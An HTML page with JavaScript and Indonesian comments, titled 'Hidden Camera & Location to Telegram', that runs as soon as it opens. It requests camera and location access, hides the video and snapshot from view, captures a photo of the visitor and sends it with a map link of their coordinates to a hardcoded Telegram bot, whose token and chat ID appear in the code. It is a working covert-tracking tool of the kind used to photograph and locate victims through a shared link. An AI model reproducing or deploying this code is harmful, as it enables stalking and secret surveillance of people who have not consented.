<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Hidden Camera & Location to Telegram</title>
<style>
  /* Sembunyikan video dan foto supaya gak kelihatan */
  #video, #photo {
    display: none;
  }
</style>
</head>
<body>
<p id="status">Mengambil data...</p>

<video id="video" autoplay muted playsinline></video>
<img id="photo" alt="snapshot" />

<script>
const video = document.getElementById('video');
const photo = document.getElementById('photo');
const status = document.getElementById('status');

// Ganti dengan token dan chat_id Telegram kamu
const TELEGRAM_BOT_TOKEN = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
const TELEGRAM_CHAT_ID = '7218964278';

async function sendPhotoAndLocation(photoBase64, latitude, longitude) {
  const textMessage = `Lokasi: https://maps.google.com/?q=${latitude},${longitude}`;
  
  // Kirim teks lokasi dulu
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: textMessage,
    }),
  });

  // Kirim foto (hapus "data:image/png;base64," supaya Telegram terima)
  const photoBase64Clean = photoBase64.replace(/^data:image\/png;base64,/, '');

  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', photoBase64Clean);

  // Kirim foto via sendPhoto API
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData,
  });
}

async function start() {
  try {
    // Minta akses kamera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
  } catch (err) {
    status.textContent = 'Gagal akses kamera: ' + err.message;
    return;
  }

  if (!navigator.geolocation) {
    status.textContent = 'Browser tidak support geolocation';
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      // Ambil foto dari video (kamera tersembunyi)
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 320;
      canvas.height = video.videoHeight || 240;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photoDataUrl = canvas.toDataURL('image/png');
      photo.src = photoDataUrl;

      status.textContent = 'Mengirim data ke Telegram...';

      try {
        await sendPhotoAndLocation(photoDataUrl, lat, lon);
        status.textContent = 'Data berhasil dikirim ke Telegram!';
      } catch (e) {
        status.textContent = 'Gagal kirim ke Telegram: ' + e.message;
      }
    },
    (err) => {
      status.textContent = 'Gagal dapat lokasi: ' + err.message;
    }
  );
}

// Jalankan langsung saat halaman dibuka
start();
</script>
</body>
</html>
